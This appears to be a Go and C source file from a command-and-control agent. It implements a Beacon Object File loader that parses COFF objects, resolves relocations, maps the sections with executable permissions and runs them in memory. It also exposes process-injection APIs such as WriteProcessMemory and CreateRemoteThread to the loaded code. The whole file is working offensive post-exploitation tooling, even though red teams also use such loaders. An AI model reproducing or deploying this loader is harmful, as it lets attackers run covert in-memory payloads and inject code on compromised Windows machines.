//go:build windows && amd64

package bof

/*
#cgo CFLAGS: -O2
#include <windows.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>

// ===== Beacon Output Callbacks =====
extern void beacon_output(int type, char* data, int len);

// ===== Memory Management =====
extern LPVOID bof_alloc(SIZE_T size);
extern BOOL bof_protect(LPVOID addr, SIZE_T size, DWORD protect, PDWORD oldProtect);
extern BOOL bof_free(LPVOID addr);

// ===== Beacon Data Parser =====
typedef struct {
    char* original;
    char* buffer;
    char* ptr;
    int length;
} formatp;

// BeaconDataParse: 初始化格式解析器
static void beacon_data_parse(formatp* fmt, char* buf, int size) {
    fmt->original = buf;
    fmt->buffer = buf;
    fmt->ptr = buf;
    fmt->length = size;
}

// BeaconDataPtr: 从缓冲区获取指定长度的指针
static char* beacon_data_ptr(formatp* fmt, int size) {
    char* result;
    if (fmt->length < size) return NULL;
    result = fmt->ptr;
    fmt->ptr += size;
    fmt->length -= size;
    return result;
}

// BeaconDataInt: 提取 4 字节整数
static int beacon_data_int(formatp* fmt) {
    int value;
    if (fmt->length < 4) return 0;
    value = (int)(
        (unsigned char)fmt->ptr[0] |
        (unsigned char)fmt->ptr[1] << 8 |
        (unsigned char)fmt->ptr[2] << 16 |
        (unsigned char)fmt->ptr[3] << 24
    );
    fmt->ptr += 4;
    fmt->length -= 4;
    return value;
}

// BeaconDataShort: 提取 2 字节整数
static short beacon_data_short(formatp* fmt) {
    short value;
    if (fmt->length < 2) return 0;
    value = (short)(
        (unsigned char)fmt->ptr[0] |
        (unsigned char)fmt->ptr[1] << 8
    );
    fmt->ptr += 2;
    fmt->length -= 2;
    return value;
}

// BeaconDataLength: 获取剩余长度
static int beacon_data_length(formatp* fmt) {
    return fmt->length;
}

// ===== Beacon Format Buffer =====
typedef struct {
    int length;
    int size;
    char* buffer;
} datap;

// BeaconFormatAlloc: 分配格式缓冲区
static void beacon_format_alloc(datap* fmt, int max_size) {
    fmt->buffer = (char*)malloc(max_size);
    if (!fmt->buffer) {
        fmt->length = 0;
        fmt->size = 0;
        return;
    }
    fmt->length = 0;
    fmt->size = max_size;
}

// BeaconFormatFree: 释放格式缓冲区
static void beacon_format_free(datap* fmt) {
    if (fmt->buffer) free(fmt->buffer);
    fmt->buffer = NULL;
    fmt->length = 0;
    fmt->size = 0;
}

// BeaconFormatAppend: 追加数据到格式缓冲区
static void beacon_format_append(datap* fmt, char* data, int size) {
    if (fmt->length + size > fmt->size) return;
    if (fmt->buffer) {
        memcpy(fmt->buffer + fmt->length, data, size);
    }
    fmt->length += size;
}

// BeaconFormatToString: 复制格式缓冲区内容
static int beacon_format_to_string(datap* fmt, char* out, int max_out) {
    if (fmt->length > max_out) return -1;
    memcpy(out, fmt->buffer, fmt->length);
    return fmt->length;
}

// ===== Beacon Output =====
// 输出类型常量
#define CALLBACK_OUTPUT    0
#define CALLBACK_OUTPUT_OEM 1
#define CALLBACK_ERROR     4
#define CALLBACK_OUTPUT_UTF8 6

// beacon_printf: 格式化输出
static void beacon_printf(char* fmt, ...) {
    char buf[4096];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len > 0) {
        beacon_output(CALLBACK_OUTPUT, buf, len);
    }
}

// beacon_printf_error: 格式化错误输出
static void beacon_printf_error(char* fmt, ...) {
    char buf[4096];
    va_list args;
    va_start(args, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    if (len > 0) {
        beacon_output(CALLBACK_ERROR, buf, len);
    }
}

// ===== BOF 入口调用 =====
extern void bof_call_entry(LPVOID entry, char* args, int args_len);
*/
import "C"

import (
	"bytes"
	"errors"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ErrVEHRegister VEH 注册失败。
var ErrVEHRegister = errors.New("veh: failed to register exception handler")

// BOF 输出类型常量
const (
	BofOutputCallback   = 0
	BofOutputDWord      = 1 // same as CALLBACK_OUTPUT_OEM
	BofOutputBinary     = 2
	BofOutputText       = 3
	BofOutputError      = 4
	BofOutputDebug      = 5
	BofOutputWarning    = 6 // same as CALLBACK_OUTPUT_UTF8
)

// bofCapture 捕获 BOF 执行期间的输出。
type bofCapture struct {
	mu     sync.Mutex
	stdout bytes.Buffer
	stderr bytes.Buffer
}

var globalCapture *bofCapture
var globalCaptureMu sync.Mutex // N-P1-9: serialize BOF execution to prevent capture race

//export beacon_output
func beacon_output(cType C.int, data *C.char, length C.int) {
	if globalCapture == nil {
		return
	}
	buf := C.GoBytes(unsafe.Pointer(data), length)
	globalCapture.mu.Lock()
	defer globalCapture.mu.Unlock()
	switch int(cType) {
	case BofOutputCallback, BofOutputDWord, BofOutputText, BofOutputDebug:
		globalCapture.stdout.Write(buf)
	case BofOutputError, BofOutputWarning:
		globalCapture.stderr.Write(buf)
	}
}

// ===== Beacon API 实现 =====

// BeaconAPI 是 BOF 可解析的 API 映射。
// BOF 通过 __imp_BeaconXxx 符号引用这些函数。
func BeaconAPI() map[string]uint64 {
	return map[string]uint64{
		"BeaconOutput":          uint64(0), // 通过 beacon_output 回调
		"BeaconDataParse":       0,         // 内联实现
		"BeaconDataPtr":         0,
		"BeaconDataInt":         0,
		"BeaconDataShort":       0,
		"BeaconDataLength":      0,
		"BeaconFormatAlloc":     0,
		"BeaconFormatFree":      0,
		"BeaconFormatAppend":    0,
		"BeaconFormatToString":  0,
		"BeaconPrintf":          0,
		"BeaconPrintfError":     0,
		"BeaconUseToken":        uint64(0),
		"BeaconRevertToken":     uint64(0),
		"BeaconIsAdmin":         uint64(0),
		"BeaconGetSpawnTo":      uint64(0),
		"BeaconCleanupProcess":  uint64(0),
		"BeaconInjectProcess":   uint64(0),
		"toWideChar":            uint64(0),
	}
}

// FillBeaconAPI 填充 Windows API 到 beacon API 映射。
// P2-2: reuse defaultBofAPIs map instead of duplicating it.
func FillBeaconAPI(apis map[string]uint64) {
	defaults := defaultBofAPIs()
	for beaconName, addr := range defaults {
		if _, exists := apis[beaconName]; !exists {
			apis[beaconName] = uint64(addr)
		}
	}
}

func resolveWindowsAPI(spec string) uintptr {
	parts := strings.SplitN(spec, "$", 2)
	if len(parts) != 2 {
		return 0
	}
	mod, err := windows.LoadLibrary(parts[0])
	if err != nil {
		return 0
	}
	// F-P0-1: Do NOT FreeLibrary — the returned function pointer points into
	// the DLL's code segment and will be called by the BOF at runtime.
	// FreeLibrary would decrement the refcount but not unload core system DLLs
	// (kernel32/msvcrt are already loaded by the Go runtime), so skipping is safe.
	addr, err := windows.GetProcAddress(mod, parts[1])
	if err != nil {
		return 0
	}
	return addr
}

type bofAPIMap map[string]uintptr

func defaultBofAPIs() bofAPIMap {
	apis := make(bofAPIMap)

	// Fill Windows API addresses
	windowsAPIs := map[string]string{
		"KERNEL32$GetLastError":          "kernel32.dll$GetLastError",
		"KERNEL32$SetLastError":          "kernel32.dll$SetLastError",
		"KERNEL32$GetCurrentProcess":     "kernel32.dll$GetCurrentProcess",
		"KERNEL32$GetCurrentThread":      "kernel32.dll$GetCurrentThread",
		"KERNEL32$VirtualAlloc":          "kernel32.dll$VirtualAlloc",
		"KERNEL32$VirtualAllocEx":        "kernel32.dll$VirtualAllocEx",
		"KERNEL32$VirtualProtect":        "kernel32.dll$VirtualProtect",
		"KERNEL32$VirtualProtectEx":      "kernel32.dll$VirtualProtectEx",
		"KERNEL32$VirtualFree":           "kernel32.dll$VirtualFree",
		"KERNEL32$VirtualFreeEx":         "kernel32.dll$VirtualFreeEx",
		"KERNEL32$WriteProcessMemory":    "kernel32.dll$WriteProcessMemory",
		"KERNEL32$ReadProcessMemory":     "kernel32.dll$ReadProcessMemory",
		"KERNEL32$CreateRemoteThread":    "kernel32.dll$CreateRemoteThread",
		"KERNEL32$OpenProcess":           "kernel32.dll$OpenProcess",
		"KERNEL32$CloseHandle":           "kernel32.dll$CloseHandle",
		"KERNEL32$GetProcAddress":        "kernel32.dll$GetProcAddress",
		"KERNEL32$LoadLibraryA":          "kernel32.dll$LoadLibraryA",
		"KERNEL32$GetModuleHandleA":      "kernel32.dll$GetModuleHandleA",
		"KERNEL32$Sleep":                 "kernel32.dll$Sleep",
		"MSVCRT$malloc":                  "msvcrt.dll$malloc",
		"MSVCRT$free":                    "msvcrt.dll$free",
		"MSVCRT$memcpy":                  "msvcrt.dll$memcpy",
		"MSVCRT$memset":                  "msvcrt.dll$memset",
		"MSVCRT$printf":                  "msvcrt.dll$printf",
		"MSVCRT$sprintf":                 "msvcrt.dll$sprintf",
		"MSVCRT$vsnprintf":               "msvcrt.dll$vsnprintf",
		"MSVCRT$strlen":                  "msvcrt.dll$strlen",
		"MSVCRT$strcpy":                  "msvcrt.dll$strcpy",
		"MSVCRT$strcat":                  "msvcrt.dll$strcat",
		"MSVCRT$memcmp":                  "msvcrt.dll$memcmp",
	}

	for beaconName, winAPI := range windowsAPIs {
		if addr := resolveWindowsAPI(winAPI); addr != 0 {
			apis[beaconName] = addr
		}
	}

	return apis
}

type coffImage struct {
	base        unsafe.Pointer
	size        uint32
	sections    []*loadedSection
	stringTable []byte
	apis        bofAPIMap
}

type loadedSection struct {
	name          string
	ptr           unsafe.Pointer
	rva           uint32
	size          uint32
	characteristics uint32
}

func readRelocations(data []byte, pointerToRelocations uint32, numRelocations uint16) ([]COFFRelocation, error) {
	relocs := make([]COFFRelocation, 0, numRelocations)
	offset := pointerToRelocations
	for i := uint16(0); i < numRelocations; i++ {
		if offset+10 > uint32(len(data)) {
			return relocs, nil
		}
		reloc := COFFRelocation{
			VirtualAddress:   uint32(data[offset]) | uint32(data[offset+1])<<8 | uint32(data[offset+2])<<16 | uint32(data[offset+3])<<24,
			SymbolTableIndex: uint32(data[offset+4]) | uint32(data[offset+5])<<8 | uint32(data[offset+6])<<16 | uint32(data[offset+7])<<24,
			Type:             uint16(data[offset+8]) | uint16(data[offset+9])<<8,
		}
		relocs = append(relocs, reloc)
		offset += 10
	}
	return relocs, nil
}

func getSymbolFullName(sym *COFFSymbol, stringTable []byte) string {
	if sym.Name[0] == 0 {
		offset := uint32(sym.Name[1]) | uint32(sym.Name[2])<<8 | uint32(sym.Name[3])<<16 | uint32(sym.Name[4])<<24
		start := offset + 4
		if int(start) < len(stringTable) {
			end := start
			for end < uint32(len(stringTable)) && stringTable[end] != 0 {
				end++
			}
			return string(stringTable[start:end])
		}
		return ""
	}
	for i, b := range sym.Name {
		if b == 0 {
			return string(sym.Name[:i])
		}
	}
	return string(sym.Name[:])
}


// ptrFromUintptr converts a uintptr to unsafe.Pointer.
// Safe when the uintptr is a valid code address.
//
//go:nosplit
func ptrFromUintptr(u uintptr) unsafe.Pointer {
	return *(*unsafe.Pointer)(unsafe.Pointer(&u))
}

// ExecuteBOF 加载并执行 BOF，返回捕获的 stdout/stderr。
func ExecuteBOF(data []byte, entryPoint string, args []byte, apis map[string]uint64) (stdout []byte, stderr []byte, err error) {
	// N-P1-9: Serialize BOF execution to prevent globalCapture race between concurrent executions
	globalCaptureMu.Lock()
	defer globalCaptureMu.Unlock()

	coff, err := ParseCOFF(data)
	if err != nil {
		return nil, nil, err
	}

	img := &coffImage{
		sections:    make([]*loadedSection, 0, len(coff.Sections)),
		apis:        defaultBofAPIs(),
		stringTable: coff.StringTable,
	}

	// 合并用户自定义 API
	for k, v := range apis {
		img.apis[k] = uintptr(v)
	}

	// 设置输出捕获
	globalCapture = &bofCapture{}
	defer func() { globalCapture = nil }()

	pageSize := uint32(syscall.Getpagesize())
	var totalSize uint32
	for _, sec := range coff.Sections {
		secSize := sec.SizeOfRawData
		if sec.VirtualSize > secSize {
			secSize = sec.VirtualSize
		}
		aligned := (secSize + pageSize - 1) &^ (pageSize - 1)
		totalSize += aligned
	}

	funMapSize := uint32(256 * 8)
	totalSize += funMapSize

	mem := C.bof_alloc(C.SIZE_T(totalSize))
	if mem == nil {
		return nil, nil, syscall.ENOMEM
	}
	defer func() {
		C.bof_protect(C.LPVOID(mem), C.SIZE_T(totalSize), C.DWORD(syscall.PAGE_READWRITE), nil)
		for i := uintptr(0); i < uintptr(totalSize); i++ {
			*(*byte)(unsafe.Add(unsafe.Pointer(mem), i)) = 0
		}
		C.bof_free(mem)
	}()

	img.base = unsafe.Pointer(mem)
	img.size = totalSize

	var offset uintptr
	for _, sec := range coff.Sections {
		secSize := sec.SizeOfRawData
		if sec.VirtualSize > secSize {
			secSize = sec.VirtualSize
		}
		aligned := (secSize + pageSize - 1) &^ (pageSize - 1)

		ls := &loadedSection{
			name:          secName(sec),
			ptr:           unsafe.Add(img.base, offset),
			rva:           sec.VirtualAddress,
			size:          secSize,
			characteristics: sec.Characteristics,
		}
		img.sections = append(img.sections, ls)

		if len(sec.Data) > 0 {
			copySize := sec.SizeOfRawData
			if copySize > uint32(len(sec.Data)) {
				copySize = uint32(len(sec.Data))
			}
			dst := unsafe.Slice((*byte)(unsafe.Add(img.base, offset)), copySize)
			copy(dst, sec.Data[:copySize])
		}
		offset += uintptr(aligned)
	}

	var funcCount uint32
	if err := processSections(coff, img, &funcCount, unsafe.Add(img.base, offset), data); err != nil {
		return nil, nil, err
	}

	for _, ls := range img.sections {
		prot := sectionProtection(ls.characteristics)
		if prot != 0 {
			var oldProtect C.DWORD
			C.bof_protect(C.LPVOID(ls.ptr), C.SIZE_T(ls.size), C.DWORD(prot), &oldProtect)
		}
	}

	entryAddr, err := findEntryPoint(coff, img, entryPoint)
	if err != nil {
		return nil, nil, err
	}

	var argPtr *byte
	var argLen int
	if len(args) > 0 {
		argPtr = &args[0]
		argLen = len(args)
	}

	// VEH: protect agent from BOF crashes. If BOF faults, VEH catches it,
	// records exception info, and returns control to Go without killing the process.
	_ = vehRegister()
	defer vehUnregister()

	crashed := bofCallSafe(entryAddr, argPtr, argLen)

	// 返回捕获的输出
	globalCapture.mu.Lock()
	stdout = bytes.Clone(globalCapture.stdout.Bytes())
	stderr = bytes.Clone(globalCapture.stderr.Bytes())
	globalCapture.mu.Unlock()

	if crashed {
		info := vehGetCrashInfo()
		stderr = append(stderr, fmt.Sprintf("\n[VEH] BOF crashed: exception=0x%08X address=0x%X\n",
			info.ExceptionCode, info.ExceptionAddress)...)
	}

	return stdout, stderr, nil
}

func processSections(coff *COFFFile, img *coffImage, funcCount *uint32, funMap unsafe.Pointer, rawData []byte) error {
	for secIdx, sec := range coff.Sections {
		if sec.NumberOfRelocations == 0 {
			continue
		}
		relocs, err := readRelocations(rawData, sec.PointerToRelocations, sec.NumberOfRelocations)
		if err != nil {
			return err
		}
		ls := img.sections[secIdx]

		for _, reloc := range relocs {
			if reloc.SymbolTableIndex >= uint32(len(coff.Symbols)) {
				continue
			}
			sym := coff.Symbols[reloc.SymbolTableIndex]
			symName := getSymbolFullName(sym, img.stringTable)
			relocAddr := unsafe.Add(ls.ptr, reloc.VirtualAddress)

			funcPtr, _, _ := resolveSymbol(coff, img, symName, sym)
			if funcPtr == 0 {
				continue
			}

			switch RelocationType(reloc.Type) {
			case IMAGE_REL_AMD64_REL32:
				if *funcCount >= 256 {
					return fmt.Errorf("relocation funcCount overflow (max 256)")
				}
				funMapPtr := unsafe.Add(funMap, uintptr(*funcCount)*8)
				*(*uintptr)(funMapPtr) = funcPtr
				// A-P0-5: 使用 funcPtr（实际目标地址）而非 funMapPtr（tramp 地址）
				offset := int32(uintptr(funcPtr) - uintptr(relocAddr) - 4)
				*(*int32)(relocAddr) = offset
				*funcCount++

			case IMAGE_REL_AMD64_ADDR64:
				*(*uintptr)(relocAddr) = funcPtr

			case IMAGE_REL_AMD64_ADDR32NB:
				rva := uint32(uintptr(funcPtr) - uintptr(img.base))
				*(*uint32)(relocAddr) = rva

			case IMAGE_REL_AMD64_REL32_1:
				if *funcCount >= 256 {
					return fmt.Errorf("relocation funcCount overflow (max 256)")
				}
				funMapPtr := unsafe.Add(funMap, uintptr(*funcCount)*8)
				*(*uintptr)(funMapPtr) = funcPtr
				offset := int32(uintptr(funcPtr) - uintptr(relocAddr) - 4 - 1)
				*(*int32)(relocAddr) = offset
				*funcCount++

			case IMAGE_REL_AMD64_REL32_2:
				if *funcCount >= 256 {
					return fmt.Errorf("relocation funcCount overflow (max 256)")
				}
				funMapPtr := unsafe.Add(funMap, uintptr(*funcCount)*8)
				*(*uintptr)(funMapPtr) = funcPtr
				offset := int32(uintptr(funcPtr) - uintptr(relocAddr) - 4 - 2)
				*(*int32)(relocAddr) = offset
				*funcCount++

			case IMAGE_REL_AMD64_REL32_3:
				if *funcCount >= 256 {
					return fmt.Errorf("relocation funcCount overflow (max 256)")
				}
				funMapPtr := unsafe.Add(funMap, uintptr(*funcCount)*8)
				*(*uintptr)(funMapPtr) = funcPtr
				offset := int32(uintptr(funcPtr) - uintptr(relocAddr) - 4 - 3)
				*(*int32)(relocAddr) = offset
				*funcCount++

			case IMAGE_REL_AMD64_REL32_4:
				if *funcCount >= 256 {
					return fmt.Errorf("relocation funcCount overflow (max 256)")
				}
				funMapPtr := unsafe.Add(funMap, uintptr(*funcCount)*8)
				*(*uintptr)(funMapPtr) = funcPtr
				offset := int32(uintptr(funcPtr) - uintptr(relocAddr) - 4 - 4)
				*(*int32)(relocAddr) = offset
				*funcCount++

			case IMAGE_REL_AMD64_REL32_5:
				if *funcCount >= 256 {
					return fmt.Errorf("relocation funcCount overflow (max 256)")
				}
				funMapPtr := unsafe.Add(funMap, uintptr(*funcCount)*8)
				*(*uintptr)(funMapPtr) = funcPtr
				offset := int32(uintptr(funcPtr) - uintptr(relocAddr) - 4 - 5)
				*(*int32)(relocAddr) = offset
				*funcCount++
			}
		}
	}
	return nil
}

func resolveSymbol(coff *COFFFile, img *coffImage, symName string, sym *COFFSymbol) (uintptr, bool, error) {
	if symName == "" {
		return 0, false, nil
	}

	if strings.HasPrefix(symName, "__imp_") {
		realName := symName[len("__imp_"):]
		if addr, ok := img.apis[realName]; ok {
			return addr, true, nil
		}
		if parts := strings.SplitN(realName, "$", 2); len(parts) == 2 {
			dllName := parts[0] + ".dll"
			funcName := parts[1]
			mod, err := windows.LoadLibrary(dllName)
			if err != nil {
				return 0, false, nil
			}
			addr, err := windows.GetProcAddress(mod, funcName)
			if err == nil && addr != 0 {
				return addr, true, nil
			}
		}
	}

	if sym.SectionNumber > 0 && int(sym.SectionNumber) <= len(coff.Sections) {
		secIdx := int(sym.SectionNumber) - 1
		ls := img.sections[secIdx]
		return uintptr(unsafe.Pointer(ls.ptr)) + uintptr(sym.Value), true, nil
	}

	return 0, false, nil
}

func findEntryPoint(coff *COFFFile, img *coffImage, name string) (uintptr, error) {
	for _, sym := range coff.Symbols {
		symName := getSymbolFullName(sym, img.stringTable)
		if symName == name && sym.SectionNumber > 0 {
			secIdx := int(sym.SectionNumber) - 1
			if secIdx >= 0 && secIdx < len(img.sections) {
				return uintptr(unsafe.Pointer(img.sections[secIdx].ptr)) + uintptr(sym.Value), nil
			}
		}
	}
	return 0, fmt.Errorf("entry point %q not found", name)
}

func secName(sec *COFFSection) string {
	end := 0
	for end < len(sec.Name) && sec.Name[end] != 0 {
		end++
	}
	return string(sec.Name[:end])
}

func sectionProtection(characteristics uint32) uint32 {
	const (
		IMAGE_SCN_MEM_EXECUTE    = 0x20000000
		IMAGE_SCN_MEM_READ       = 0x40000000
		IMAGE_SCN_MEM_WRITE      = 0x80000000
		IMAGE_SCN_MEM_NOT_CACHED = 0x04000000
		IMAGE_SCN_CNT_CODE       = 0x00000020
	)

	exec := characteristics&IMAGE_SCN_MEM_EXECUTE != 0 || characteristics&IMAGE_SCN_CNT_CODE != 0
	read := characteristics&IMAGE_SCN_MEM_READ != 0
	write := characteristics&IMAGE_SCN_MEM_WRITE != 0
	nc := characteristics&IMAGE_SCN_MEM_NOT_CACHED != 0

	var prot uint32
	switch {
	case exec && read && write:
		prot = syscall.PAGE_EXECUTE_READWRITE
	case exec && read:
		prot = syscall.PAGE_EXECUTE_READ
	case exec && write:
		prot = syscall.PAGE_EXECUTE_READWRITE
	case read && write:
		prot = syscall.PAGE_READWRITE
	case exec:
		prot = syscall.PAGE_EXECUTE_READ
	case read:
		prot = syscall.PAGE_READONLY
	case write:
		prot = syscall.PAGE_READWRITE
	}
	if nc && prot != 0 {
		prot |= 0x20000000 // PAGE_NOCACHE
	}
	return prot
}
